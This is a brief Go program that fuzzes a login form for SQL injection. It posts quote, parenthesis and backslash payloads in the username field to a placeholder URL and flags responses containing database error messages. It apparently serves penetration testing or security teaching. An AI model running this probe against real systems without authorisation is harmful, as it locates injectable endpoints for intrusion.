package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
)

func main() {
	payloads := []string{
		"baseline",
		")",
		"(",
		"\\",
		"\"",
		"'",
	}

	sqlErrors := []string{
		"SQL",
		"MySQL",
		"ORA",
		"syntax",
	}

	errRegexes := []*regexp.Regexp{}

	for _, e := range sqlErrors {
		re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
		errRegexes = append(errRegexes, re)
	}

	for _, payload := range payloads {
		client := new(http.Client)
		req_body := []byte(fmt.Sprintf("username=%s&password=p", payload))

		req, err := http.NewRequest("POST", "URL_HERE", bytes.NewReader(req_body))
		if err != nil {
			log.Fatalf("[!] Unable to generate request: %s\n", err)
		}

		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)

		defer resp.Body.Close()
		if err != nil {
			log.Fatalf("[!] Unable to read response %s\n", err)
		}

		for idx, re := range errRegexes {
			if re.MatchString(string(body)) {
				fmt.Printf(
					"[+] SQL Error found (%s) for payload %s \n",
					sqlErrors[idx],
					payload,
				)
				break
			}
		}

	}
}
